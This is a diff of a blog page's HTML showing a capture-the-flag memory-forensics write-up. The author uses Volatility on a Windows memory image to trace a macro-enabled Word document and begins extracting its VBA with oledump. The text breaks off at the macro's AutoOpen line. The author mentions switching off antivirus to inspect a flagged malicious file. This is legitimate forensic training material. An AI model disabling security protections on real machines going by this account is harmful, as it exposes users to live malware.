+</span></span><span class=line><span class=cl>0x000000003fea3060 wininit.exe         <span class=m>384</span>    <span class=m>320</span> 0x000000003be52000 2016-06-02 07:46:18 UTC+0000
+</span></span><span class=line><span class=cl>0x000000003fedf450 System                <span class=m>4</span>      <span class=m>0</span> 0x0000000000187000 2016-06-02 07:46:17 UTC+0000
+</span></span></code></pre></td></tr></table></div></div><p>As you can see in the process list, we have WINWORD.exe, firefox.exe, cmd.exe, notepad.exe and PING.exe running. Perhaps what we are looking for can be found within these programs.</p><p>My next step was to dump a list of all the files contained in the image. The full list is too large so I&rsquo;ll only show small portion.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -251,42 +164,28 @@ Offset<span class=o>(</span>P<span class=o>)</span>          Name               
 </span><span class=lnt>16
 </span><span class=lnt>17
 </span><span class=lnt>18
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile<span class=o>=</span>Win7SP0x64 filescan
-Volatility Foundation Volatility Framework 2.4
-Offset<span class=o>(</span>P<span class=o>)</span>            <span class=c1>#Ptr   #Hnd Access Name</span>
------------------- ------ ------ ------ ----
-0x0000000004dfef20     <span class=m>12</span>      <span class=m>0</span> R--r-- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\P</span>ROGRA~2<span class=se>\M</span>ICROS~1<span class=se>\O</span>ffice14<span class=se>\U</span>RLREDIR.DLL
-0x000000001a7063a0     <span class=m>16</span>      <span class=m>0</span> RW-rw- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\A</span>ppData<span class=se>\L</span>ocal<span class=se>\M</span>ozilla<span class=se>\F</span>irefox<span class=se>\P</span>rofiles<span class=se>\c</span>6digex6.default<span class=se>\c</span>ache2<span class=se>\e</span>ntries<span class=se>\F</span>E00C2B6C2F56600231E20DF3A49C88C24168A40
-0x000000001a7065f0      <span class=m>2</span>      <span class=m>1</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\N</span>etwork Shortcuts
-0x000000001a7069e0      <span class=m>2</span>      <span class=m>0</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\R</span>ecent<span class=se>\d</span>esktop.ini
-0x000000001a706dd0     <span class=m>11</span>      <span class=m>0</span> R--r-d <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\n</span>tlanman.dll
-0x000000001a820560      <span class=m>5</span>      <span class=m>0</span> RW-rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\$</span>Directory
-0x000000001a8208d0      <span class=m>4</span>      <span class=m>0</span> R--r-- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\F</span>onts<span class=se>\m</span>sjhbd.ttf
-0x000000001a820af0     <span class=m>17</span>      <span class=m>1</span> R--r-d <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\e</span>n-US<span class=se>\w</span>in32k.sys.mui
-0x000000001a897750      <span class=m>7</span>      <span class=m>0</span> R--r-d <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\m</span>prapi.dll
-0x000000001aac4730     <span class=m>15</span>      <span class=m>0</span> R--r-d <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\e</span>sent.dll
-0x000000001db213e0      <span class=m>7</span>      <span class=m>0</span> R--r-- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\F</span>onts<span class=se>\s</span>imsunb.ttf
-0x000000001db217a0     <span class=m>16</span>      <span class=m>0</span> -W-rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\A</span>ppData<span class=se>\L</span>ocal<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\T</span>emporary Internet Files<span class=se>\L</span>ow<span class=se>\C</span>ontent.IE5<span class=se>\N</span>OXO93NB<span class=se>\c</span>sf_front<span class=o>[</span>1<span class=o>]</span>.jpg
-0x000000001db21ce0      <span class=m>7</span>      <span class=m>0</span> R--r-- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\F</span>onts<span class=se>\m</span>syh.ttf
-<span class=o>[</span>...<span class=o>]</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>I noticed that there is user called coresec in the file list so I thought I would extract all the files within the user&rsquo;s home folder to see if any thing interesting would show up.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ grep <span class=s1>&#39;\\Device\\HarddiskVolume2\\Users\\coresec\\&#39;</span> filelist.txt &gt; coresec.txt
-</code></pre></td></tr></table>
-</div>
-</div><p>When looking through the coresec.txt I noticed this line
-<code>0x000000003e0d7590 5 0 RW-r-- \Device\HarddiskVolume2\Users\coresec\Desktop\SecretStuff.docm</code>. I ran the following command to see if there was anything else in the user&rsquo;s desktop.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile<span class=o>=</span>Win7SP0x64 filescan
+</span></span><span class=line><span class=cl>Volatility Foundation Volatility Framework 2.4
+</span></span><span class=line><span class=cl>Offset<span class=o>(</span>P<span class=o>)</span>            <span class=c1>#Ptr   #Hnd Access Name</span>
+</span></span><span class=line><span class=cl>------------------ ------ ------ ------ ----
+</span></span><span class=line><span class=cl>0x0000000004dfef20     <span class=m>12</span>      <span class=m>0</span> R--r-- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\P</span>ROGRA~2<span class=se>\M</span>ICROS~1<span class=se>\O</span>ffice14<span class=se>\U</span>RLREDIR.DLL
+</span></span><span class=line><span class=cl>0x000000001a7063a0     <span class=m>16</span>      <span class=m>0</span> RW-rw- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\A</span>ppData<span class=se>\L</span>ocal<span class=se>\M</span>ozilla<span class=se>\F</span>irefox<span class=se>\P</span>rofiles<span class=se>\c</span>6digex6.default<span class=se>\c</span>ache2<span class=se>\e</span>ntries<span class=se>\F</span>E00C2B6C2F56600231E20DF3A49C88C24168A40
+</span></span><span class=line><span class=cl>0x000000001a7065f0      <span class=m>2</span>      <span class=m>1</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\N</span>etwork Shortcuts
+</span></span><span class=line><span class=cl>0x000000001a7069e0      <span class=m>2</span>      <span class=m>0</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\R</span>ecent<span class=se>\d</span>esktop.ini
+</span></span><span class=line><span class=cl>0x000000001a706dd0     <span class=m>11</span>      <span class=m>0</span> R--r-d <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\n</span>tlanman.dll
+</span></span><span class=line><span class=cl>0x000000001a820560      <span class=m>5</span>      <span class=m>0</span> RW-rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\$</span>Directory
+</span></span><span class=line><span class=cl>0x000000001a8208d0      <span class=m>4</span>      <span class=m>0</span> R--r-- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\F</span>onts<span class=se>\m</span>sjhbd.ttf
+</span></span><span class=line><span class=cl>0x000000001a820af0     <span class=m>17</span>      <span class=m>1</span> R--r-d <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\e</span>n-US<span class=se>\w</span>in32k.sys.mui
+</span></span><span class=line><span class=cl>0x000000001a897750      <span class=m>7</span>      <span class=m>0</span> R--r-d <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\m</span>prapi.dll
+</span></span><span class=line><span class=cl>0x000000001aac4730     <span class=m>15</span>      <span class=m>0</span> R--r-d <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\S</span>ystem32<span class=se>\e</span>sent.dll
+</span></span><span class=line><span class=cl>0x000000001db213e0      <span class=m>7</span>      <span class=m>0</span> R--r-- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\F</span>onts<span class=se>\s</span>imsunb.ttf
+</span></span><span class=line><span class=cl>0x000000001db217a0     <span class=m>16</span>      <span class=m>0</span> -W-rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\A</span>ppData<span class=se>\L</span>ocal<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\T</span>emporary Internet Files<span class=se>\L</span>ow<span class=se>\C</span>ontent.IE5<span class=se>\N</span>OXO93NB<span class=se>\c</span>sf_front<span class=o>[</span>1<span class=o>]</span>.jpg
+</span></span><span class=line><span class=cl>0x000000001db21ce0      <span class=m>7</span>      <span class=m>0</span> R--r-- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\W</span>indows<span class=se>\F</span>onts<span class=se>\m</span>syh.ttf
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>I noticed that there is user called coresec in the file list so I thought I would extract all the files within the user&rsquo;s home folder to see if any thing interesting would show up.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ grep <span class=s1>&#39;\\Device\\HarddiskVolume2\\Users\\coresec\\&#39;</span> filelist.txt &gt; coresec.txt
+</span></span></code></pre></td></tr></table></div></div><p>When looking through the coresec.txt I noticed this line
+<code>0x000000003e0d7590 5 0 RW-r-- \Device\HarddiskVolume2\Users\coresec\Desktop\SecretStuff.docm</code>. I ran the following command to see if there was anything else in the user&rsquo;s desktop.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -301,71 +200,40 @@ Offset<span class=o>(</span>P<span class=o>)</span>            <span class=c1>#P
 </span><span class=lnt>13
 </span><span class=lnt>14
 </span><span class=lnt>15
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ grep Desktop coresec.txt
-0x000000003da9aaf0      <span class=m>2</span>      <span class=m>1</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
-0x000000003daaeb20     <span class=m>16</span>      <span class=m>0</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop<span class=se>\d</span>esktop.ini
-0x000000003df60340     <span class=m>16</span>      <span class=m>0</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\L</span>inks<span class=se>\D</span>esktop.lnk
-0x000000003df64140      <span class=m>1</span>      <span class=m>1</span> R--rw- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
-0x000000003e0d7590      <span class=m>5</span>      <span class=m>0</span> RW-r-- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop<span class=se>\S</span>ecretStuff.docm
-0x000000003e0da070      <span class=m>2</span>      <span class=m>0</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\S</span>endTo<span class=se>\D</span>esktop.ini
-0x000000003e2954b0      <span class=m>1</span>      <span class=m>1</span> R--rw- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
-0x000000003ecb8cd0      <span class=m>2</span>      <span class=m>1</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
-0x000000003f013890      <span class=m>2</span>      <span class=m>1</span> RW-r-- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop<span class=se>\S</span>ecretStuff.docm
-0x000000003f035f20      <span class=m>1</span>      <span class=m>1</span> R--rw- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
-0x000000003f2c07a0     <span class=m>16</span>      <span class=m>0</span> -W---- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop<span class=se>\~</span><span class=nv>$cretStuff</span>.docm
-0x000000003fc29730     <span class=m>16</span>      <span class=m>0</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop<span class=se>\n</span>oflaghere.bat
-0x000000003fca9650      <span class=m>1</span>      <span class=m>1</span> R--rw- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
-0x000000003fe79070      <span class=m>1</span>      <span class=m>1</span> R--rw- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
-</code></pre></td></tr></table>
-</div>
-</div><p>The <code>SecretStuff.docm</code> file looks interesting so I looked up the <strong>.docm</strong> extension on google and found out that it is a <em>macro enabled document</em>, which means it&rsquo;s highly likely it contains the next piece of information to solve the challenge.</p>
-<p>To make sure that <strong>WINWORD.exe</strong> was used to open the file I ran the following command:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ grep Desktop coresec.txt
+</span></span><span class=line><span class=cl>0x000000003da9aaf0      <span class=m>2</span>      <span class=m>1</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
+</span></span><span class=line><span class=cl>0x000000003daaeb20     <span class=m>16</span>      <span class=m>0</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop<span class=se>\d</span>esktop.ini
+</span></span><span class=line><span class=cl>0x000000003df60340     <span class=m>16</span>      <span class=m>0</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\L</span>inks<span class=se>\D</span>esktop.lnk
+</span></span><span class=line><span class=cl>0x000000003df64140      <span class=m>1</span>      <span class=m>1</span> R--rw- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
+</span></span><span class=line><span class=cl>0x000000003e0d7590      <span class=m>5</span>      <span class=m>0</span> RW-r-- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop<span class=se>\S</span>ecretStuff.docm
+</span></span><span class=line><span class=cl>0x000000003e0da070      <span class=m>2</span>      <span class=m>0</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\A</span>ppData<span class=se>\R</span>oaming<span class=se>\M</span>icrosoft<span class=se>\W</span>indows<span class=se>\S</span>endTo<span class=se>\D</span>esktop.ini
+</span></span><span class=line><span class=cl>0x000000003e2954b0      <span class=m>1</span>      <span class=m>1</span> R--rw- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
+</span></span><span class=line><span class=cl>0x000000003ecb8cd0      <span class=m>2</span>      <span class=m>1</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
+</span></span><span class=line><span class=cl>0x000000003f013890      <span class=m>2</span>      <span class=m>1</span> RW-r-- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop<span class=se>\S</span>ecretStuff.docm
+</span></span><span class=line><span class=cl>0x000000003f035f20      <span class=m>1</span>      <span class=m>1</span> R--rw- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
+</span></span><span class=line><span class=cl>0x000000003f2c07a0     <span class=m>16</span>      <span class=m>0</span> -W---- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop<span class=se>\~</span><span class=nv>$cretStuff</span>.docm
+</span></span><span class=line><span class=cl>0x000000003fc29730     <span class=m>16</span>      <span class=m>0</span> R--rwd <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop<span class=se>\n</span>oflaghere.bat
+</span></span><span class=line><span class=cl>0x000000003fca9650      <span class=m>1</span>      <span class=m>1</span> R--rw- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
+</span></span><span class=line><span class=cl>0x000000003fe79070      <span class=m>1</span>      <span class=m>1</span> R--rw- <span class=se>\D</span>evice<span class=se>\H</span>arddiskVolume2<span class=se>\U</span>sers<span class=se>\c</span>oresec<span class=se>\D</span>esktop
+</span></span></code></pre></td></tr></table></div></div><p>The <code>SecretStuff.docm</code> file looks interesting so I looked up the <strong>.docm</strong> extension on google and found out that it is a <em>macro enabled document</em>, which means it&rsquo;s highly likely it contains the next piece of information to solve the challenge.</p><p>To make sure that <strong>WINWORD.exe</strong> was used to open the file I ran the following command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile<span class=o>=</span>Win7SP0x64 cmdline
-<span class=o>[</span>...<span class=o>]</span>
-WINWORD.EXE pid:   <span class=m>1116</span>
-Command line : <span class=s2>&#34;C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE&#34;</span> /n <span class=s2>&#34;C:\Users\coresec\Desktop\SecretStuff.docm&#34;</span>
-************************************************************************
-<span class=o>[</span>...<span class=o>]</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Nice, now I&rsquo;m sure <strong>WINWORD.exe</strong> was used to open the file. Next step is to try to get the contents of <code>SecretStuff.docm</code>, this can be done by running the following command:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile<span class=o>=</span>Win7SP0x64 dumpfiles -Q 0x000000003f013890 --name -D secrectdocfolder/
-</code></pre></td></tr></table>
-</div>
-</div><p>0x000000003f013890 is the offset found the file list earlier. Now I have the file in my <strong>secrectdocfolder</strong>. Running the <code>file</code> command gives us what type of file it is:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile<span class=o>=</span>Win7SP0x64 cmdline
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>WINWORD.EXE pid:   <span class=m>1116</span>
+</span></span><span class=line><span class=cl>Command line : <span class=s2>&#34;C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE&#34;</span> /n <span class=s2>&#34;C:\Users\coresec\Desktop\SecretStuff.docm&#34;</span>
+</span></span><span class=line><span class=cl>************************************************************************
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>Nice, now I&rsquo;m sure <strong>WINWORD.exe</strong> was used to open the file. Next step is to try to get the contents of <code>SecretStuff.docm</code>, this can be done by running the following command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./volatility_2.4_x64 -f Coresec-CTF-SecurityFest2016.vmem --profile<span class=o>=</span>Win7SP0x64 dumpfiles -Q 0x000000003f013890 --name -D secrectdocfolder/
+</span></span></code></pre></td></tr></table></div></div><p>0x000000003f013890 is the offset found the file list earlier. Now I have the file in my <strong>secrectdocfolder</strong>. Running the <code>file</code> command gives us what type of file it is:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ file file.None.0xfffffa800eaacb30.SecretStuff.docm.dat
-file.None.0xfffffa800eaacb30.SecretStuff.docm.dat: Zip archive data, at least v2.0 to extract
-</code></pre></td></tr></table>
-</div>
-</div><p>Alright, so it looks like a .zip file, when I first unpacked the file my anti-virus software started to ring. Apparently there is a file within the &ldquo;zip&rdquo; file that is malicious. I temporarily disabled my anti-virus software inspected the file, which was: <strong>word/vbaProject.bin</strong></p>
-<h2 id=world-of-macro>World of Macro</h2>
-<p>When I was researching <strong>.docm</strong> files I came across a tool called <a href=https://blog.didierstevens.com/programs/oledump-py/>oledump</a>, with this tool I could inspect <strong>vbaProject.bin</strong> and display the marco code hidden within the file.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ file file.None.0xfffffa800eaacb30.SecretStuff.docm.dat
+</span></span><span class=line><span class=cl>file.None.0xfffffa800eaacb30.SecretStuff.docm.dat: Zip archive data, at least v2.0 to extract
+</span></span></code></pre></td></tr></table></div></div><p>Alright, so it looks like a .zip file, when I first unpacked the file my anti-virus software started to ring. Apparently there is a file within the &ldquo;zip&rdquo; file that is malicious. I temporarily disabled my anti-virus software inspected the file, which was: <strong>word/vbaProject.bin</strong></p><h2 id=world-of-macro>World of Macro</h2><p>When I was researching <strong>.docm</strong> files I came across a tool called <a href=https://blog.didierstevens.com/programs/oledump-py/>oledump</a>, with this tool I could inspect <strong>vbaProject.bin</strong> and display the marco code hidden within the file.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -376,25 +244,18 @@ file.None.0xfffffa800eaacb30.SecretStuff.docm.dat: Zip archive data, at least v2
 </span><span class=lnt> 9
 </span><span class=lnt>10
 </span><span class=lnt>11
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ./oledump.py vbaProject.bin
-  1:       <span class=m>424</span> <span class=s1>&#39;PROJECT&#39;</span>
-  2:        <span class=m>71</span> <span class=s1>&#39;PROJECTwm&#39;</span>
-  3: M    <span class=m>2603</span> <span class=s1>&#39;VBA/NewMacros&#39;</span>
-  4: m     <span class=m>994</span> <span class=s1>&#39;VBA/ThisDocument&#39;</span>
-  5:      <span class=m>8447</span> <span class=s1>&#39;VBA/_VBA_PROJECT&#39;</span>
-  6:      <span class=m>2409</span> <span class=s1>&#39;VBA/__SRP_0&#39;</span>
-  7:       <span class=m>122</span> <span class=s1>&#39;VBA/__SRP_1&#39;</span>
-  8:      <span class=m>1057</span> <span class=s1>&#39;VBA/__SRP_2&#39;</span>
-  9:       <span class=m>156</span> <span class=s1>&#39;VBA/__SRP_3&#39;</span>
- 10:       <span class=m>570</span> <span class=s1>&#39;VBA/dir&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>This looks interesting. After running <code>./oledump.py --help</code> to understand how to use it, I ran the following command:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./oledump.py vbaProject.bin
+</span></span><span class=line><span class=cl>  1:       <span class=m>424</span> <span class=s1>&#39;PROJECT&#39;</span>
+</span></span><span class=line><span class=cl>  2:        <span class=m>71</span> <span class=s1>&#39;PROJECTwm&#39;</span>
+</span></span><span class=line><span class=cl>  3: M    <span class=m>2603</span> <span class=s1>&#39;VBA/NewMacros&#39;</span>
+</span></span><span class=line><span class=cl>  4: m     <span class=m>994</span> <span class=s1>&#39;VBA/ThisDocument&#39;</span>
+</span></span><span class=line><span class=cl>  5:      <span class=m>8447</span> <span class=s1>&#39;VBA/_VBA_PROJECT&#39;</span>
+</span></span><span class=line><span class=cl>  6:      <span class=m>2409</span> <span class=s1>&#39;VBA/__SRP_0&#39;</span>
+</span></span><span class=line><span class=cl>  7:       <span class=m>122</span> <span class=s1>&#39;VBA/__SRP_1&#39;</span>
+</span></span><span class=line><span class=cl>  8:      <span class=m>1057</span> <span class=s1>&#39;VBA/__SRP_2&#39;</span>
+</span></span><span class=line><span class=cl>  9:       <span class=m>156</span> <span class=s1>&#39;VBA/__SRP_3&#39;</span>
+</span></span><span class=line><span class=cl> 10:       <span class=m>570</span> <span class=s1>&#39;VBA/dir&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>This looks interesting. After running <code>./oledump.py --help</code> to understand how to use it, I ran the following command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -408,28 +269,21 @@ file.None.0xfffffa800eaacb30.SecretStuff.docm.dat: Zip archive data, at least v2
 </span><span class=lnt>12
 </span><span class=lnt>13
 </span><span class=lnt>14
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ ./oledump.py -v -s <span class=m>3</span> vbaProject.bin
-Attribute <span class=nv>VB_Name</span> <span class=o>=</span> <span class=s2>&#34;NewMacros&#34;</span>
-Sub AutoOpen<span class=o>()</span>
